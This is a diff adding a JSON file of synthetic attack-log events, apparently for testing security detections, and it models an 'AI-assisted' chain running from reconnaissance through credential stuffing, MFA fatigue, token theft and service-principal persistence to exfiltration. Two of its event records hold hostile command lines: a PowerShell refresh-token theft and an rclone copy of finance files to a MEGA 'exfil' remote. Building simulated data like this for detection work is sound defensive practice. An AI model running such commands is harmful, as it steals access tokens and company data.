@@ -1,0 +1,234 @@
+[
+  {
+    "name": "AI-Powered Reconnaissance - Mass Profile Scraping & Target Identification",
+    "delay": 0.1,
+    "events": [
+      {
+        "source": "proxy",
+        "event_type": "proxy",
+        "url": "https://www.linkedin.com/search/results/people/",
+        "http_method": "GET",
+        "http_status": 200,
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+        "content_type": "text/html",
+        "SourceIP": "{{CNC_IP}}",
+        "data": {
+          "SearchQuery": "IT administrator OR security engineer",
+          "Industry": "technology",
+          "ResultsPerPage": 50
+        },
+        "multiply": 10,
+        "mitre": {
+          "tactic": "Reconnaissance",
+          "technique_id": "T1593.001",
+          "technique_name": "Search Open Websites/Domains: Social Media"
+        },
+        "killchain_phase": "reconnaissance"
+      },
+      {
+        "source": "dns",
+        "event_type": "dns_query",
+        "Name": "webmail.litware.com",
+        "QueryType": "A",
+        "ResultCode": "0",
+        "IPAddresses": "{{RANDOM_IP}}",
+        "multiply": 20,
+        "mitre": {
+          "tactic": "Reconnaissance",
+          "technique_id": "T1590",
+          "technique_name": "Gather Victim Network Information"
+        },
+        "killchain_phase": "reconnaissance"
+      }
+    ]
+  },
+  {
+    "name": "AI-Steered Credential Stuffing with Adaptive Pacing",
+    "delay": 0.05,
+    "events": [
+      {
+        "source": "auth",
+        "event_type": "authentication",
+        "UserPrincipalName": "{{RANDOM_EMAIL}}",
+        "ClientAppUsed": "Browser",
+        "ResultType": "50126",
+        "ResultDescription": "Invalid username or password",
+        "IPAddress": "{{RANDOM_IP}}",
+        "risk_level": "Low",
+        "location": "{{RANDOM_LOCATION}}",
+        "city": "{{RANDOM_CITY}}",
+        "multiply": 30,
+        "mitre": {
+          "tactic": "Credential Access",
+          "technique_id": "T1110.001",
+          "technique_name": "Brute Force: Password Guessing"
+        },
+        "killchain_phase": "credential-access"
+      },
+      {
+        "source": "auth",
+        "event_type": "authentication",
+        "UserPrincipalName": "{{RANDOM_EMAIL}}",
+        "ClientAppUsed": "Browser",
+        "ResultType": "0",
+        "ResultDescription": "Success after adaptive delay",
+        "IPAddress": "{{RANDOM_IP}}",
+        "risk_level": "Low",
+        "location": "{{RANDOM_LOCATION}}",
+        "city": "{{RANDOM_CITY}}",
+        "mitre": {
+          "tactic": "Credential Access",
+          "technique_id": "T1110.001",
+          "technique_name": "Brute Force: Password Guessing"
+        },
+        "killchain_phase": "credential-access"
+      }
+    ]
+  },
+  {
+    "name": "AI-Optimized MFA Fatigue (Timing-Based)",
+    "delay": 0.2,
+    "events": [
+      {
+        "source": "auth",
+        "event_type": "authentication",
+        "UserPrincipalName": "{{RANDOM_EMAIL}}",
+        "ClientAppUsed": "Mobile",
+        "ResultType": "50126",
+        "ResultDescription": "Locked/Invalid Password",
+        "IPAddress": "{{CNC_IP}}",
+        "risk_level": "Medium",
+        "location": "{{RANDOM_LOCATION}}",
+        "mfa_method": "Push",
+        "multiply": 15,
+        "mitre": {
+          "tactic": "Credential Access",
+          "technique_id": "T1621",
+          "technique_name": "Multi-Factor Authentication Request Generation"
+        },
+        "killchain_phase": "credential-access"
+      },
+      {
+        "source": "auth",
+        "event_type": "authentication",
+        "UserPrincipalName": "{{RANDOM_EMAIL}}",
+        "ClientAppUsed": "Mobile",
+        "ResultType": "0",
+        "ResultDescription": "MFA Approved (Fatigued User)",
+        "IPAddress": "{{CNC_IP}}",
+        "risk_level": "High",
+        "location": "{{RANDOM_LOCATION}}",
+        "mfa_method": "Push",
+        "mitre": {
+          "tactic": "Credential Access",
+          "technique_id": "T1621",
+          "technique_name": "Multi-Factor Authentication Request Generation"
+        },
+        "killchain_phase": "credential-access"
+      }
+    ]
+  },
+  {
+    "name": "Token Theft & Persistence via AI-Scripted Session Hijack",
+    "delay": 4.0,
+    "events": [
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "powershell.exe",
+        "FolderPath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "powershell.exe -Command \"$response = Invoke-RestMethod -Uri 'https://login.microsoftonline.com/common/oauth2/v2.0/token' -Method Post -Body @{client_id='d30d1df8-3a3d-4f8a-9876'; scope='https://graph.microsoft.com/.default'; refresh_token='[REDACTED]'; grant_type='refresh_token'}; $response.access_token | Out-File -FilePath 'C:\\Users\\{{RANDOM_USER}}\\AppData\\Local\\Temp\\tokencache.dat'\"",
+        "AccountName": "{{RANDOM_USER}}",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "mitre": {
+          "tactic": "Credential Access",
+          "technique_id": "T1528",
+          "technique_name": "Steal or Forge Authentication Tokens"
+        },
+        "is_malicious": true,
+        "killchain_phase": "credential-access"
+      },
+      {
+        "source": "cloud_activity",
+        "event_type": "cloud_activity",
+        "OperationName": "Add service principal",
+        "ResourceId": "/subscriptions/prod/providers/Microsoft.AzureAD",
+        "Caller": "{{RANDOM_EMAIL}}",
+        "IPAddress": "{{CNC_IP}}",
+        "data": {
+          "ServicePrincipalName": "AutoUpdate-Service-Connector",
+          "Permissions": "Mail.ReadWrite, User.Read.All, Files.ReadWrite.All"
+        },
+        "mitre": {
+          "tactic": "Persistence",
+          "technique_id": "T1136.003",
+          "technique_name": "Create Account: Cloud Account"
+        },
+        "is_malicious": true,
+        "killchain_phase": "persistence"
+      }
+    ]
+  },
+  {
+    "name": "Data Exfiltration via AI-Discovered Stealth Channel",
+    "delay": 2.0,
+    "events": [
+      {
+        "source": "endpoint",
+        "event_type": "process_creation",
+        "ActionType": "ProcessCreated",
+        "FileName": "rclone.exe",
+        "FolderPath": "C:\\Users\\{{RANDOM_USER}}\\AppData\\Local\\Temp",
+        "ProcessId": "{{RANDOM_PID}}",
+        "ProcessCommandLine": "rclone copy C:\\Users\\{{RANDOM_USER}}\\Documents\\finance\\Q2_Projections.xlsx MEGA_Cloud:/exfil/ --verbose --bwlimit 2M --log-file C:\\Users\\{{RANDOM_USER}}\\AppData\\Local\\Temp\\rclone.log",
+        "AccountName": "{{RANDOM_USER}}",
+        "DeviceName": "{{RANDOM_HOST}}",
+        "mitre": {
+          "tactic": "Exfiltration",
+          "technique_id": "T1567.002",
+          "technique_name": "Exfiltration Over Web Service: Cloud Storage"
+        },
+        "is_malicious": true,
+        "killchain_phase": "exfiltration"
+      },
+      {
+        "source": "endpoint",
+        "event_type": "network_connection",
+        "DeviceAction": "allowed",
+        "Protocol": "TCP",
+        "SourcePort": "{{RANDOM_PORT}}",
+        "DestinationIP": "95.128.43.22",
+        "DestinationPort": 443,
+        "DeviceName": "{{RANDOM_HOST}}",
+        "AccountName": "{{RANDOM_USER}}",
+        "mitre": {
+          "tactic": "Exfiltration",
+          "technique_id": "T1048.002",
+          "technique_name": "Exfiltration Over Alternative Protocol: Web Services"
+        },
+        "is_malicious": true,
+        "killchain_phase": "exfiltration"
+      },
+      {
+        "source": "security_incident",
+        "event_type": "security_incident",
+        "title": "AI-Assisted Multi-Stage Credential Access & Exfiltration",
+        "severity": "Critical",
+        "description": "Incident chain: AI-steered credential stuffing -> MFA fatigue -> token theft -> service principal creation -> data exfiltration via rclone. Full killchain executed in under 12 minutes. Correlated events across SigninLogs, DeviceProcessEvents, AzureActivity, and CloudAppEvents.",
+        "status": "New",
+        "owner": "SOC-Tier2",
+        "tactics": "['Reconnaissance', 'Credential Access', 'Persistence', 'Exfiltration']",
+        "techniques": "['T1593.001', 'T1110.001', 'T1621', 'T1528', 'T1136.003', 'T1567.002']",
+        "mitre": {
+          "tactic": "Exfiltration",
+          "technique_id": "T1567.002",
+          "technique_name": "Exfiltration Over Web Service: Cloud Storage"
+        },
+        "is_malicious": true,
+        "killchain_phase": "exfiltration"
+      }
+    ]
+  }
+]
